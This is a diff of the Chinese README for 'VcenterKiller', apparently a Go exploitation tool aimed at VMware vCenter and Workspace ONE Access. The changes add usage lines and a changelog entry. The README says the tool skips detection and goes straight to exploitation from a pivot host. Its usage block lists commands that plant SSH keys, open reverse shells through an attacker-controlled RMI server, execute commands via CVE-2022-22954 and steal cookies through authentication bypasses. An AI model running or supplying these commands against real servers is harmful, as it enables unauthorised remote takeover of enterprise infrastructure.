@@ -7,7 +7,11 @@
 
 
 
-目前集成了对Vcenter log4j漏洞的检测和利用功能，思路来自于带哥[@j5s](https://github.com/j5s)的项目[SuperFastjsonScan](https://github.com/j5s/SuperFastjsonScan)，原理参考[Golang实现RMI协议自动化检测Fastjson](https://www.anquanke.com/post/id/249402)，简单来说就是不借助dnslog之类的平台，只要你和目标主机是通的并且你的主机/跳板没有被防火墙做端口限制，那就能直接验证目标是否远程调用了你的rmi服务。
+写这个工具单纯是为了方便，它没有什么高大上的东西
+
+
+
+目前集成了对Vcenter log4j漏洞的检测和利用功能，思路来自于带哥[@j5s](https://github.com/j5s)的项目[SuperFastjsonScan](https://github.com/j5s/SuperFastjsonScan)，原理参考[Golang实现RMI协议自动化检测Fastjson](https://www.anquanke.com/post/id/249402)，简单来说就是不借助dnslog之类的平台，只要你和目标主机是通的并且你的主机/跳板没有被防火墙做端口限制，那就能直接验证目标是否进行了远程调用。
 
 
 
@@ -30,7 +34,7 @@ VMware vRealize Operations Manager ...
 
 一般Vcenter都放在内网，并且漏洞特征也都是烂大街，像什么fscan啦一扫就出来了，那么VcenterKiller就不是用来检测目标是否存在漏洞的，而是直接尝试利用，一般通过CS/MSF在跳板上来执行，所以去掉了其余花里胡哨的输出。
 
-为什么用GO，因为Python写起来方便但是用起来很蛋疼，各种依赖库，编译吧体积太大，C#没法跨平台，写到一半扔了。
+为什么用GO，因为Python写起来方便但是用起来很蛋疼，各种依赖库，并且编译出来体积太大，C#没法跨平台，写到一半扔了。
 
 #### 3.使用方法
 
@@ -43,7 +47,10 @@ go build -o main.exe
 ./main.exe -u https://192.168.1.1 -m 21972 -f id_rsa.pub -t ssh //传公钥
 ./main.exe -u https://192.168.1.1 -m 21985 -t rshell -r rmi://xx.xx.xx.xx:1099/xx
 ./main.exe -u https://192.168.1.1 -m log4center -t scan // scan log4j
-./main.exe -u https://192.168.1.1 -m log4center -t rshell -r rmi://xx.xx.xx.xx:1099/xx //get reverseshell
+./main.exe -u https://192.168.1.1 -m log4center -t rshell -r rmi://xx.xx.xx.xx:1099/xx //get reverseshell and other
+./main.exe -u https://xx.xx.com -m 22954 whoami
+./main.exe -u https://xx.xx.com -m 22972 //get cookie
+./main.exe -u https://xx.xx.com -m 31656 //If CVE-2022-22972不能用就换CVE-2022-31656
 ```
 
 #### 4.免责声明
@@ -60,6 +67,7 @@ go build -o main.exe
 V1.0 上线
 V1.1 针对CVE-2021-21985添加了利用rmi反弹shell的功能，前提是你要启动一个rmi服务器，例如jndi-injection-exploit
 V1.2 增加了针对Vcenter的log4j检测和验证能力
+V1.3 增加了对Vmware WorkSpace One Access的漏洞验证功能，包括CVE-2022-22954 远程命令执行；CVE-2022-22972、CVE-2022-31656身份鉴别绕过
 ...
 ```
 
